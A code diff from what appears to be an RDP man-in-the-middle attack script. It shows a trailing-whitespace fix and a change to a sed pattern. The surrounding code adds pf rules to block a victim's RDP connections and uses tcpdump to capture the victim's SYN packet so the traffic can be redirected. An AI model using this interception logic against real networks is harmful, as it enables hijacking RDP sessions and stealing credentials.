@@ -116,7 +116,7 @@ set_iptables_2 () {
 
 # Define function to add/remove pf rules on the fly for RDP routing and NAT
 set_pf_1 () {
-    echo "block return on "$IFACE" proto tcp from "$VICTIM_IP" to any port 3389 flags S/S" >> $PF_TMP_FILE    
+    echo "block return on "$IFACE" proto tcp from "$VICTIM_IP" to any port 3389 flags S/S" >> $PF_TMP_FILE
 
     $PFCTL -qf $PF_TMP_FILE 2>/dev/null 1>&2
 }
@@ -206,7 +206,7 @@ echo "[*] Waiting for a SYN packet to the original destination..."
 ORIGINAL_DEST="$(tcpdump -n -c 1 -i "$IFACE" \
     "tcp[tcpflags] ==  tcp-syn" and \
     src host "$VICTIM_IP" and dst port 3389 2> /dev/null \
-    | awk '{print $5}' | sed 's/.3389.*//')"
+    | awk '{print $5}' | sed 's/.\(3389\|ms-wbt-server\).*//')"
 
 if [ -z "$ORIGINAL_DEST" ];
 then
